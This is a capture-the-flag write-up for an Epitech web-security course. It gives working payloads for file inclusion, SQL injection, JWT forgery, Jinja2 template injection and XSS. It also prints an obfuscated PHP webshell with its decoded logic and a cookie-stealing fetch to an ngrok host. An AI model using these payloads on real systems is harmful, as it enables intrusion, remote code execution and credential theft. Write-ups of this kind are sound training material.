# Web Security

CTF made for Epitech by Alexis AURIAC, Victor THOMAS

- [auth50](#auth50)
- [auth100](#auth100)
- [auth200](#auth200)
- [b64js](#b64js)
- [JS200](#JS200)
- [lfi1](#lfi1)
- [lfi2](#lfi2)
- [lfi3](#lfi3)
- [lfi4](#lfi4)
- [OBF100](#OBF100)
- [SCRIPT_KIDDING](#SCRIPT_KIDDING)
- [potionseller](#potionseller)
- [potionseller2](#potionseller2)
- [mythique1](#mythique1)
- [mythique2](#mythique2)
- [ssti1](#ssti1)
- [ssti2](#ssti2)
- [ssti3](#ssti3)
- [ssti4](#ssti4)
- [whatsup](#whatsup)
- [whatsup2](#whatsup2)
- [xxe1](#xxe1)
- [confessions](#confessions)

# auth50

## What it is

A website that asks for a username and a password.

"FUCK GUESSING CHALLENGES!!" is at the top of the page.

## Solution

You just need to guess the credentials.

username: ```admin```

password: ```password```

flag: ```BFS{We_f1n@llY_c@n_Tr0lL_t3am5_1Ts_0uR_TuRn}```

# auth100

## What it is

A website that asks for a username and a password.

The username must be at least 6 characters long.

We can get the source code of the page (see source.php).

We can see that the password is the sum of the numeric value of each characters in the username.

## Solution

(See genPwd.py)

```bash
$ ./genPwd.py aaaaaa
582
```

# auth200

## What it is

A website that asks for a flag.

We can access the source of the page (see source.php).

In the source we can see that it xors the input with the key ```Th1s_1s_@_x0r_k3y_l0l!``` and encodes it to hex.

It compares the result to ```3c09431700451c00232d19531900026c1e2a09431f7e38075d527e1052```.

## Solution

(see solve.py)

Decode it from hex and xor it with the key.

website flag: ```hard_to_crack_i_guess_lol!!!!```

challenge flag: ```BFS{1_L0v3_t0_x0r_tH1ng5_l1k3_@_p0nY!}```

# b64js

## What it is

It is a website that asks for a password.

The password goes through this:
```js
window.btoa(unescape(encodeURIComponent(input)))
```

```unescape``` and ```encodeURIComponent``` sanitize the input.

```window.btoa``` transforms the input into base64.

It then compares the result to ```RXZlckhlYXJkT2ZCYXNlNjQ/```.

## Solution

Decode ```RXZlckhlYXJkT2ZCYXNlNjQ/``` from base64:
```bash
$ echo "RXZlckhlYXJkT2ZCYXNlNjQ/" | base64 -d
EverHeardOfBase64?
```
flag: ```BFS{EverHeardOfBase64?}```

# JS200

## What it is

It asks for an input, it goes through this function:
```js
function validate() {
	var flag = "K@UC,bswslubr.wohp.dibokdmdb";
	var input = document.getElementById("flag").value
	var i = 0
	var out = ""
	do {
		out += String.fromCharCode(input.charCodeAt(i) ^ 1);
		out += String.fromCharCode(input.charCodeAt(i + 1) ^ 3);
		out += String.fromCharCode(input.charCodeAt(i + 2) ^ 3);
		out += String.fromCharCode(input.charCodeAt(i + 3) ^ 7);
		i += 4;
	} while (i < 28);
	if (out === flag) {
		alert("Congratz! Validate this challenge with the flag BFS{" + input + "}")
	} else {
		alert("Try again !")
	}
}
```

It xors the input with ```1337``` (byte1 ^ 1, byte2 ^ 3, etc...).

## Solution

(see solve.py)

Since we have the key and the cipher we can xor them together to get the plain text.

flag: ```BFS{JCVD-approves-this-challenge}```

# lfi1

## What it is

It's a PHP website with links to youtube videos, the flag is in one of the comments of the videos (supposedly).

We have access to the source of index.php.

Line 61:
```php
require('config.php');
```
This file probably contains the flag.

At line 62 we have this:
```php
if (isset($_GET['lang']))
{
  require($_GET['lang']);
}
```
It directly gives user input to ```require```.

## Solution

https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/

We can make the server require config.php, but the php in it will be executed.

To prevent that we can use ```php://filter/convert.base64-encode/resource=config.php```.
```
https://filters.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config.php
```

This base64 string will be at the top of the page:
```
PD9waHAKICAvLyBDb25ncmF0eiAhIEZMQUcgSVMgQkZTe1VfaDR2M19VbjAhISF9Cj8+Cg==
```

After decoding it:
```php
<?php
  // Congratz ! FLAG IS BFS{U_h4v3_Un0!!!}
?>
```

flag: ```BFS{U_h4v3_Un0!!!}```

# lfi2

## What it is

A very simple website.

It says ```Flag is in an obvious html place.```.

## Solution

Tried a few urls before finding ```https://noprotection.secu-web.blackfoot.dev/flag.html```

It shows ```Congratz, you can validate with ZOB{y34h_y0u_f0und_m3}```.

# lfi3

## What it is

Almost the same as lfi1, but we don't have access to the source code.

## Solution

The solution is the same as for lfi1, except that the input given is concatenated with '.php'

Url: 
```
https://extprotect.secu-web.blackfoot.dev/?lang=php://filter/convert.base64-encode/resource=config
```

Base64 config.php:
```
PD9waHAKICAvLyBDb25ncmF0eiAhIEZMQUcgSVMgWk9CezN2M25fcHIwdF9jNG43X3N0MHBfbTN9Cj8+Cg==
```

Base64 decoded:
```
<?php
  // Congratz ! FLAG IS ZOB{3v3n_pr0t_c4n7_st0p_m3}
?>
```

flag: ```ZOB{3v3n_pr0t_c4n7_st0p_m3}```

# lfi4

## What it is

Same as the others, but we don't know what file the flag is in.

## Solution

We need to find the path to the file the flag is in.

We can do that by executing code from a remote file ([source](https://www.php.net/manual/en/features.remote-files.php)):

### Serving the remote file

This code will be executed on the server and print the files in the server's current directory:
```php
echo implode(", ", scandir("."))
```

We can make a simple http server with python3
```
python3 -m http.server 8080
```
```
$ curl localhost:8080/remote.php 
<?php
    echo implode(", ", scandir("."))
?>
```

To make it available to the server we can use [ngrok](https://ngrok.com/):
```
ngrok http 8080
```

### Executing the remote code

Url to execute the remote code:
```
https://remote.secu-web.blackfoot.dev/?lang=https://d84a-163-5-23-68.eu.ngrok.io/remote.php
```

This appears on the page:
```
., .., hidden_file.html, index.php 
```

At https://remote.secu-web.blackfoot.dev/hidden_file.html we find:
```
Congratz, you can validate with ZOB{sh0uld_h4v3_h1dd3n_b3773r}
```

flag: ```ZOB{sh0uld_h4v3_h1dd3n_b3773r}```

# OBF100

## What it is

(see index.html)

It asks for a password and checks it with obfuscated code.

At around line 9, column 662 we can see:
```js
if(password=== input)
```

At column 597:
```js
var password=_0xf7f7[0]
```

And at column 5:
```js
var _0xf7f7=["\x67\x67\x65\x7A", ...
```

The password is ```\x67\x67\x65\x7A``` and the input is compared directly against it.

## Solution

If we interpret the string we find the password.

```bash
$ echo "\x67\x67\x65\x7A"
ggez
```

flag: ```BCS{ggez}```

# SCRIPT_KIDDING

## What it is

A website with this text:
```
Niark niark niark, I infected this website with a webshell that I found on the internet, but I forgot to read the instructions T_T
Can you help me find out how to use it ? I swear I did not hide it in i_am_not_a_backdoor.php
```

```i_am_not_a_backdoor.php```:
```php
<?php


eval("\n\$dgreusdi = intval(__LINE__) * 337;");

$a = "7VdrbyI3FP3Or3AQCjOCRMyD7KYJUbKrZHfVdLNtmrRSlI7MYMBkXvIMkG2T/97jGQY8BrbRdqW2UkcawPbxuef6XtuXUx5xL2WZ0WRCxMIL4lGzTT7eXF6aR7XT5SC6vRyQYrRTGQrpo8cemT/NeBx5GQ9ZCcFw3vYCHvLMkH21WoMmiYhnN674hJj1zgi6F3GAtG/T674xGt7bq6vvP5wTmpKGH8cPnHlxxHonZSObx2btjxrBU2FSxsGXD4c0oiMmPB7Ne674alOgUH0hKn0ggWxjMIZlnGhOH1acoOXG/A/HjAjBXSbG+iN8mCkg+JCs77Cs3y6cPXh6O8+Vx7hvPTyM/V8VDOYF7IMmqUXgqWTUV674NCn1m7Mffry14svz0ZvLm7P0/bllXf86P/t0HXy8vT3rvr2Zn1/eWNa7n4LRm18uPryv6746lOtQZ9LBp4aSZ4N674pzvWjDsaJHs78YJr+V4zmZdHRH9bSYo4Tz09X1z4tgRpjXn2YymIKljAp/rC9NNaQlarGqXwxqSa5iv11gFdZNsa06ocW4iPN6t674P6wLx02g95mqJtNBIWJwFrS2+CgPZjQTO2zHV4OOQiL674QxOFSvL0RhsaGI9zpHpMGP674ZyALckQc32JC/gkh0+WcNUk2d3dwCThrRbU8VZrm9cN9pixSHrjJVTQ674DJjMSgp7hr83kQC5V2KwbvG5F5d4c3+6j37xB8LQ7dorq95JYurJKscRgxwlq3ietekD02ofXoiO4a2U6rbt6742ag+GM8knChnTC5slwQg9Hk8Fo674rMRnwySNB5MhqxpmqTXI2sWNp1lZ0LQz4Yp1TGcjwtIOudZvqdUCjCsQuAjqUmd17+rLiWVdCrt+uhdM5k1746745TcbJjIk8Ibcg0wLZtPY7e1azimH+OCY49wWnAf9dbiw5RyPS9kahmmmqGRysuDpo3m/nKWLNHnHLy674xSt1l14zcGNKNI4gf2WTvgTqfRSnfqC8aiyu5UJuaRqSk2NsDx2wNWHqf4JVNlGWp0YP3Wtv9yxjdKt6NK5m8yp4rTLgf9gORRMs2WHvSnwy674Ti0Mo78n6QZlhxFhGac9q/933H+M6sLW20yZd9HXlt7vi6nbRPsD7Cu9rvIfAdvD+BT8g+LRXROB1MR0z2wRcoAKTJWHAWbBsAW674BYgFjAWQBZQFmHa5IbOBtyQu8DbwNvN3drsIGjw0eGzw27DkdRRDGHfA44HHA44DHAd4B3gHeAd6FPRc4FzhXegCcC5wLnPtqxeUC7wLfBb77H8u674/7n+rVxmtQTCCZQXQeSYlMVLcW4dofhVisx+DqxWdDjA7vLCJJ+Rlyr3ZKcnjehFjpy+ZcIu6TxeXJjk+Bg7Uy9F5CPvc50PBVX1YpPVLI+mTCVYqY+m4Qb9nLSIteZ4XsqtKW1ZX3YOH0/6742OBiMVF10taLBKhT3Xmurcu0XyrT/lqZtibz4CtUOi9V6bx6745bZ5C5674vljcf84CBTibBCf5l6xb9PDf7C94OHpOcnOC60CwsbvD9Xl5674+7qAPlatR16vy9rb25TVcsF6xFVrsbLgLgzJ4uJP";
$a = str_replace($dgreusdi, "E", $a);
eval (gzinflate(base64_decode($a)));
```

After changing the last ```eval``` call to a ```print``` and executing it we get another php script (see backdoor.php).

The name of variables and functions in it are purposefully misleading.

### Breakdown of each function

```php
function _base64_decode($input)
```
Decodes base64.

```php
function improve_meta()
{
    return _base64_decode("UAMQV1oLEgBLUAsHE11SXwAPSlNVVA5CUwELU11GRlgBWFIH" ) ;
}
```
A constant, basically.


```php
function append_strings($append, $string)
{
    return $append ^ $string;
}
```
Xors 2 strings ([how it works](https://stackoverflow.com/a/34248791/12864941)).

```php
function make_submission($people, $collaborate)
```
Xors 2 strings, the second can be shorter than the first, in that case it start again from the beginning.

```php
function screen_submission($sub_key, $sub_meta)
{
    $sub = make_submission($sub_key, append_strings(improve_meta(), 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe'));

    return make_submission($sub, $sub_meta) ;
}
```
Xors ```sub_key``` with the xor of ```improve_meta``` and another constant, then xors that with ```sub_meta```.


```php
function remove_letter($data, $key)
{
    return @unserialize(screen_submission($data, $key));
}
```
[Unserializes](https://www.php.net/manual/en/function.unserialize.php) the result of ```screen_submission```.

### Other code

```php
foreach ($_COOKIE as $cookie_one=>$cookie_two)
{
    $approvals = $cookie_two;

    $manager_invitation = $cookie_one;

    $approvals = remove_letter(_base64_decode($approvals), $manager_invitation) ;

    if ($approvals)
    {
        break;
    }
}
```
Tries to use ```remove_letter``` on each cookie, decodes the data with base64.

```php
if (!$approvals)
{
    foreach ($_POST as $contribute=>$research)
    {
        $approvals = $research;

        $manager_invitation = $contribute;

        $approvals = remove_letter(_base64_decode($approvals), $manager_invitation);

        if ($approvals)
        {
            break;
        }
    }
}
```
Same as previous code but it tries to find the key/data in the body instead.

```php
if (!isset($approvals['ak']) || !(append_strings(improve_meta(), 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe')) == $approvals['ak'])
{
    $approvals = Array();
}
else
{
    switch ($approvals['a']){
        case "i":
            $array = Array();
            $array['pv'] = @phpversion();
            $array['sv'] = '1.0-1';
            echo @serialize($array);
            break;
        case "e":
            eval($approvals['d']);
            break;
    }
    exit();

}
```
Checks that the key ```ak``` is equal to a specific value.
if ```approvals['a'] == 'i'``` prints general information.
if ```approvals['a'] == 'e'``` executes the code in ```approvals['d']```.

### Recap

- get the key and data from cookies or body
	- decode the data with base64
	- xor it with the result of ```improve_meta() ^ 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe'```
	- xor the result with the key provided
	- unserialize the result
- check that ```data['ak'] == improve_meta() ^ 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe'```
- if ```data['a'] == 'i'``` print info
- if ```data['a'] == 'e'``` execute code in ```data['d']```

## Solution

(see gen_data.py)

Do the same process but backwards.

Select a key (any will do): ```abc```

Start with the desired data:
```js
{
	"ak": "4ef63abe-1abd-45a6-913d-6fb99657e24b", // improve_meta() ^ 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe'
	"a": "e",
	"d": "echo implode(', ', scandir('.'));" // list files in the current directory
}
```

- serialize it
- xor it with the key
- xor it with ```4ef63abe-1abd-45a6-913d-6fb99657e24b```
- encode it to base64

We get:
```
ND02bSpxOTV0cmJqJ3QkbjBjdnlmN2B4ZGVjPXZkNTdifmI0NDEobmAxZyp4NmE4PHliY2ZneDlwaXV0Zj4jOXluJ283aXRkdzx2bWA4IWNsa3A7NnxtdmY2JDRyO2s+O2tlPXNyeHUhf3ZyNmZrMzhwKyBgdyooPm1sKQ==
```
```
$ curl -XPOST https://script-kidding.secu-web.blackfoot.dev/i_am_not_a_backdoor.php -F "abc=ND02bSpxOTV0cmJqJ3QkbjBjdnlmN2B4ZGVjPXZkNTdifmI0NDEobmAxZyp4NmE4PHliY2ZneDlwaXV0Zj4jOXluJ283aXRkdzx2bWA4IWNsa3A7NnxtdmY2JDRyO2s+O2tlPXNyeHUhf3ZyNmZrMzhwKyBgdyooPm1sKQ=="
., .., i_am_a_secret_file, i_am_not_a_backdoor.php, index.php, nottheflag
```

```
$ curl https://script-kidding.secu-web.blackfoot.dev/i_am_a_secret_file
PLZ{D0n.t_t3ll_m0mMY_|_w4$_n4ugh7¥}
```

flag: ```PLZ{D0n.t_t3ll_m0mMY_|_w4$_n4ugh7¥}```

# potionseller

## What it is

A website that displays potions, it is a reference to a meme ([source](https://knowyourmeme.com/memes/potion-seller)).

We can get the potions in json at ```/potions```.
```bash
curl https://potionseller.secu-web.blackfoot.dev/potions
```
```json
{
  "potions": [
    {
      "id": 0,
      "name": "Health Potion",
      "description": "A boost of health for trying times",
      "img": "https://static.turbosquid.com/Preview/001318/811/G1/_D.jpg",
      "price": 20
    },
    {
      "id": 1,
      "name": "Stamina Potion",
      "description": "That potion literally no one ever uses",
      "img": "https://static.turbosquid.com/Preview/2014/07/08__08_31_26/01.jpg1ba8860a-4b96-48a4-b8a2-ae33c533a8a8Large.jpg",
      "price": 10
    },
    {
      "id": 2,
      "name": "Resurrection Potion",
      "description": "When god fails you, this is the next best thing",
      "img": "https://i.pinimg.com/originals/d7/ac/3c/d7ac3cccb65c2dd43cf6b733e02405d0.jpg",
      "price": 100
    },
    {
      "id": 3,
      "name": "Love Potion",
      "description": "Success not guaranteed if you are a goblin",
      "img": "http://wiccanspells.info/wp-content/uploads/2015/10/love-potion-tincture.jpg",
      "price": 2000
    },
    {
      "id": 4,
      "name": "My Strongest Potion",
      "description": "This potion will kill a dragon - let alone a man!",
      "img": "https://78.media.tumblr.com/5e7b833f6932170b688ad73fbfdfd862/tumblr_mwgbvlkRdo1stqkamo1_500.jpg",
      "price": 100000000
    },
    {
      "id": 5,
      "name": "Truth Serum (6x)",
      "description": "Perfect for questing adventurers or for wild parties!",
      "img": "http://payload138.cargocollective.com/1/3/107627/5077854/TruthSerum_jpeg_02_800.jpg",
      "price": 600
    }
  ]
}
```

We can get a specific potion at ```/potions/{potion id}```, for example:
```bash
curl https://potionseller.secu-web.blackfoot.dev/potions/1
```
```json
{
  "potion": {
    "id": 1,
    "name": "Stamina Potion",
    "description": "That potion literally no one ever uses",
    "price": 10,
    "img": "https://static.turbosquid.com/Preview/2014/07/08__08_31_26/01.jpg1ba8860a-4b96-48a4-b8a2-ae33c533a8a8Large.jpg",
    "longdescription": "Are you tired after running after that pesky thief, or after climbing a huge mountain only to find a Korok seed at the top? Fear not - this Stamina potion will have you on your feet in no time! Can also replace a solid coffee in the morning!"
  }
}
```

We can't get the strongest potion (potion 4) that way:
```bash
curl https://potionseller.secu-web.blackfoot.dev/potions/4
```
```json
{
  "err": "That potion is too strong for you, traveller!"
}
```

Trying to put some characters instead of a number will result in an error:
```bash
curl https://potionseller.secu-web.blackfoot.dev/potions/\=
```
```json
{
  "err": "That looks like code! I don't like code, only potions!"
}
```
"code" chars: '=', ';', ':', '{', '}', '[', ']', '(', ')', '!'

Trying to make 4 with operations can be detected:
```bash
curl https://potionseller.secu-web.blackfoot.dev/potions/1+3
```
```json
{
  "err": "Nice try, but that operation adds up to 4! I'm telling you, this potion is too strong!"
}
```
```bash
curl https://potionseller.secu-web.blackfoot.dev/potions/2\*2
```
```json
{
  "err": "Nice try, but that operation adds up to 4! I'm telling you, this potion is too strong!"
}
```

Other interesting results:
```bash
curl https://potionseller.secu-web.blackfoot.dev/potions/dragon
```
```json
{
  "err": "There was an error querying the SQLite database: Error: SQLITE_ERROR: no such column: dragon"
}
```
```bash
curl https://potionseller.secu-web.blackfoot.dev/potions/id
```
```json
{
  "potion": {
    "id": 0,
    "name": "Health Potion",
    "description": "A boost of health for trying times",
    "price": 20,
    "img": "https://static.turbosquid.com/Preview/001318/811/G1/_D.jpg",
    "longdescription": "Are you in a bit of a pickle? Did a giant troll just bash your head in with a large tree perhaps? Do not fear - this Health potion is just the thing you need to get back on your feet!"
  }
}
```
```bash
curl https://potionseller.secu-web.blackfoot.dev/potions/name
```
```json
{}
```

## Solution

```"2"+"2"``` isn't detected like the operations mentionned above (not sure why):
```bash
curl 'https://potionseller.secu-web.blackfoot.dev/potions/"2"+"2"'
```
```json
{
  "potion": {
    "id": 4,
    "name": "My Strongest Potion",
    "description": "This potion will kill a dragon - let alone a man!",
    "price": 100000000,
    "img": "https://78.media.tumblr.com/5e7b833f6932170b688ad73fbfdfd862/tumblr_mwgbvlkRdo1stqkamo1_500.jpg",
    "longdescription": "It's just water with a colorant in it, don't tell anyone! The flag is: BFS{I_n33d_y0uR_5tr0ng3St_p07ion!}"
  }
}
```

flag: ```BFS{I_n33d_y0uR_5tr0ng3St_p07ion!}```

# potionseller2

## What it is

Almost the same as potionseller except:
- The strongest potion is available without injection
- A link to the "Admin Space" appeared on the site, connecting requires a login and a password

## Solution

(see solve.js)

We need to get credentials for the admin.

The server has new measures in place to catch injection attempts:
```
https://potionseller2.secu-web.blackfoot.dev/potions/1 or 1=1
```
```json
{
  "err": "That looks like code! I don't like code, only potions!"
}
```

A lot of these measures can be bypassed by replacing spaces with empty comments ```/**/``` -> ```%2f**%2f``` ([source](https://portswigger.net/support/sql-injection-bypassing-common-filters)):
```
https://potionseller2.secu-web.blackfoot.dev/potions/7 or id > 4
-> https://potionseller2.secu-web.blackfoot.dev/potions/7%2f**%2for%2f**%2fid%2f**%2f>%2f**%2f4
```
```json
{
  "potion": {
    "id": 5,
    "name": "Truth Serum (6x)",
    "description": "Perfect for questing adventurers or for wild parties!",
    "price": 600,
    "img": "http://payload138.cargocollective.com/1/3/107627/5077854/TruthSerum_jpeg_02_800.jpg",
    "longdescription": "From the mines of Moria straight to your local potion dealer, this 6-pack Truth Serum is bound to help you in your interrogations - and also makes for a great time with your party when the adventure is over!"
  }
}
```


We can list all tables using ```UNION``` and the ```sqlite_master``` table ([sqlite system tables](https://www.techonthenet.com/sqlite/sys_tables/index.php)):
```
https://potionseller2.secu-web.blackfoot.dev/potions/7 ) union SELECT *,null FROM sqlite_master where type is 'table' and tbl_name is not 'potions'-- -
```
```json
{
  "potion": {
    "id": "table",
    "name": "users",
    "description": "users",
    "price": 3,
    "img": "CREATE TABLE users(id INT PRIMARY KEY, username TEXT NOT NULL, password TEXT NOT NULL)",
    "longdescription": null
  }
}
```

To get the users:
```
https://potionseller2.secu-web.blackfoot.dev/potions/7 ) union SELECT *,null,null,null FROM users-- -
```
```json
{
  "potion": {
    "id": 0,
    "name": "potionSellerRoot",
    "description": "367ab14fdf7fa39f96143302dc5b7ef9",
    "price": null,
    "img": null,
    "longdescription": null
  }
}
```

The login is ```potionSellerRoot``` and the password hash is ```367ab14fdf7fa39f96143302dc5b7ef9```.

Using a [hash cracking website](https://hashes.com/en/decrypt/hash) we can get the password (it is a MD5).

password: ```potions```

We can now login to the Admin Space and get the flag.

flag: ```BFS{Y4Y_f0R_5qLi!}```

# mythique1

## What it is

It's a website that requires an admin cookie to get the flag.

We can see in the code of the page (see index.js) that it splits the cookie at every ```.```, it then decodes the second part of the cookie for base64 and parses it as a JSON object.

The decoded cookie looks like this:
```json
{
	"exp": 1669289642,
	"data": {
		"name": "Nuage À Gauche",
		"isAdmin": false
	},
	"iat": 1669286042
}
```

## Solution

(see solve.js)

Create an admin cookie:
```json
{
	"exp": 1669289642,
	"data": {
		"name": "Hack3r",
		"isAdmin": true
	},
	"iat": 1669286042
}
```

Encode it to base64 and insert it into the second part of the original cookie.

Note: the name used matters in this case, names with non-ascii characters need more steps to work, but since we can put in any name it doesn't really matters.

flag: ```BFS{JwT_m0r3_l1k3_jwP33_xd}```

# mythique2

## What it is

A website with a button that requires an admin jwt cookie to give the flag.

We know the jwt cookie uses RS256 ([source](https://stackoverflow.com/a/39239395/12864941)).

We can download the public key (see ```serverkey.pub```).

## Solution

(see solve.js)

We can use an algorithm confusion attack ([source](https://debricked.com/blog/json-web-tokens/)).

We create an admin cookie with HS256, using the server's public key as a secret key.

When the server tries to verify the token was signed with its private key, it will use its public key. But since our token is HS256, it will think the secret keys match.

flag: ```BFS{!W0W_muCh_s3cURe_V3rY_jWt!}``` 

# ssti1

## What it is

A website made with flask that uses jinja2 for templating.

It takes a name in an input field and displays it.

## Solution

From a string literal you can get the base class and open a file ([source](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/)).

To get the content of ```app.py```:
```py
{{'abc'.__class__.__base__.__subclasses__()[96].__subclasses__()[0].__subclasses__()[0]('app.py').read()}}
```

We get:
```py
b'from flask import Flask, request, render_template_string, config\n\n\napp = Flask(__name__)\n\napp.config["FLAG"] = "BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}"\n\n\n@app.route("/")\ndef index():\n    name = request.args.get("username", "guest")\n    template = open("./index.html").read().format(name)\n    return render_template_string(template)\n\n\nif __name__ == "__main__":\n    app.run()\n'
```

After formatting:
```py
from flask import Flask, request, render_template_string, config

app = Flask(__name__)

app.config["FLAG"] = "BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}"

@app.route("/")
def index():
	name = request.args.get("username", "guest")
	template = open("./index.html").read().format(name)
	return render_template_string(template)

if __name__ == "__main__":
    app.run()
```

flag: ```BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}```

# ssti2

## What it is

Same as ssti1 but the flag is not in app.py

## Solution

Using the request object we can get access to the ```os``` module and use ```popen()``` to run bash commands ([source](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/#rce-bypassing-as-much-as-i-possibly-can)).

List files in the current directory:
```py
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

Result:
```
app.py
config.py
flag.txt
index.html
```

To open ```flag.txt```:
```py
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```

flag: ```BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}```

# ssti3

## What it is

Same as ssti2 but the flag is not in app.py or in a file.

Files in the directory:
```
app.py
config.py
getFlag
index.html
```

```getFlag``` is an elf file.

## Solution

Run ```getFlag```:
```py
{{request.application.__globals__.__builtins__.__import__('os').popen('./getFlag').read()}}
```

flag: ```BFS{Oh_My..._I_Can_RCE_PyTh0N!!}```

# ssti4

## What it is

Same as sst3.

The flag doesn't seem to be in any of the server files.

```dalek.py``` launches the web server and kills children processes every 10 secondes, preventing backdoors.

There is a ```docker-compose.yml``` file:
```yml
version: "3.3"

# FIXME: Don't forget to place this file inside .dockerignore ! we don't want anyone looking at this

services:
  ssti4:
    build: "./Challenges/SSTI/ssti4"
    restart: always
    networks:
      ssti4:

  # TODO: This is old don't forget to stop the server in the next version !
  # toto8042:
  #   build: "./Challenges/SSTI/ssti4/toto8042"
  #   restart: always
  #   port:
  #     - ":" WARNING: The port was still open, asked Sysadmin to remove it last month....
  #   networks:
  #     ssti4:'
```

It references a toto8042 service that shouldn't be up but still is.

```yml
#   port:
  #     - ":"
```
This tells us that all ports are forwarded.

ssti4 and toto8042 are on the same network ([docker-compose networks](https://docs.docker.com/compose/networking/#specify-custom-networks)).

We can confirm that by pinging toto8042:
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('ping -c 1 toto8042').read()}}
```
```
PING toto8042 (172.23.0.2): 56 data bytes
64 bytes from 172.23.0.2: icmp_seq=0 ttl=64 time=0.147 ms
--- toto8042 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.147/0.147/0.147/0.000 ms
```

## Solution

### Port discovery

(see port_discovery.js)

nmap, nc, telnet and others are not available on ssti4 so we can't use them to discover ports.

The list of the 1000 most used ports is available [here](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/).

We can test if a port is open with this bash command ([source](https://stackoverflow.com/a/35338529/12864941)):
```bash
timeout 1 bash -c '</dev/tcp/toto8042/${i}' && echo -n open || echo -n closed
```

Using this method we find that ports 4242 and 8042 are open.

### Port 8042

Running curl on 8042 (using ssti) returns this:
```bash
$ curl toto8042:8042
this is not the way this time, goodluck !!
```

### Port 4242

(see solve.js)

Port 4242 is not http.

We can use python3 to open a TCP socket.

Run python code with ssti:
```py
{{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\"").read()}}
```
Note: quotes get a little tricky, the python command can only use single quotes, at least using our implementation.

To see stderr we add ``` 2>&1 | cat``` at the end of the command (redirects stderr to stdout).
```py
{{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\" 2>&1 | cat").read()}}
```

We can prevent modifications of the output by jinja by using the "safe" filter ([source](https://stackoverflow.com/a/12341532/12864941)), it is particularly useful when reading python errors.
```py
{{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\" 2>&1 | cat").read()|safe}}
```

We can then open a socket to ```toto8042:4242``` and read it ([source](https://wiki.python.org/moin/TcpCommunication)):
```py
import socket

TCP_IP = 'toto8042'
TCP_PORT = 4242
BUFFER_SIZE = 128

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
s.close()

print(data.decode('utf-8'))
```

flag: ```BFS{doCKErcEpt1On8042}```

# whatsup

## What it is

It is a chat webapp, you can send messages to other users.

Some words are censored (replaced by ```*```), they will be replaced wherever they appear in the message.\
For example ```console``` will become ```***sole```.
Some of the words we found:
- con
- ass
- fuck
- shit
- bite
- merde
- cul
- hell

The max input size is 255 char.

## Solution

We can put code in the ```onpageshow``` event of the body ([source](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpageshow)).

example:
```html
<body onpageshow="alert('Hey')">
```

To use function/objects like ```console``` that contain censored words we can use this simple trick:
```html
<body onpageshow="globalThis['co'+'nsole'].log('Hey')">
```

We need our injected code to send us the admin's cookie when the admin loads their messages.

### Setting up the server

First we need a server with that can be reached by the admin's client, here is a simple solution

Use socat to create a tcp socket, we could use a real http server but it doesn't really matter.
```bash
$ socat TCP-LISTEN:9000,fork stdout
```

Then to make it available online we can use [ngrok](https://ngrok.com/):
```bash
$ ngrok http 9000

Session Status                online                                                                                
Account                       User (Plan: Free)                                                                   
Version                       3.1.0                                                                                 
Region                        Europe (eu)                                                                           
Latency                       42ms                                                                                  
Web Interface                 http://127.0.0.1:4040                                                                 
Forwarding                    https://7097-163-5-23-68.eu.ngrok.io -> http://localhost:9000
```
Notice the ```Forwarding``` section, ```https://7097-163-5-23-68.eu.ngrok.io``` is where we'll want the admin to make requests.

### XSS command

We can use [fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) to make http requests, the cookie is in ```document.cookie```.
```html
<body onpageshow="fetch('https://7097-163-5-23-68.eu.ngrok.io', {method: 'post', body: document.cookie})">
```

A first request will arrive immediately, that's the one from our client. Within a minute a second request will arrive from the admin.

Using socat it should look something like this:
```
POST / HTTP/1.1
Host: 7097-163-5-23-68.eu.ngrok.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Content-Length: 0
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Content-Type: text/plain;charset=UTF-8
Origin: https://whatsup.secu-web.blackfoot.dev
Pragma: no-cache
Referer: https://whatsup.secu-web.blackfoot.dev/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Te: trailers
X-Forwarded-For: 163.5.23.68
X-Forwarded-Proto: https

POST / HTTP/1.1
Host: 7097-163-5-23-68.eu.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/78.0.3882.0 Safari/537.36
Content-Length: 36
Accept: */*
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Origin: http://whatsup:8000
Referer: http://whatsup:8000/admin
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
X-Forwarded-For: 35.242.202.31
X-Forwarded-Proto: https

flag=BFS{XSS_M0R3_L!K3_FR33_C00K!35}
```

flag: ```BFS{XSS_M0R3_L!K3_FR33_C00K!35}```

# whatsup2

## What is it

Same as whatsup, except we can also send an image.

The method used in whatsup doesn't work, the html is not interpreted.

## Solution

The way the image link is inserted in the element probably looks something like this:
```js
'<img src="' + input + '">'
```

We can put '"' in our input to change other properties.

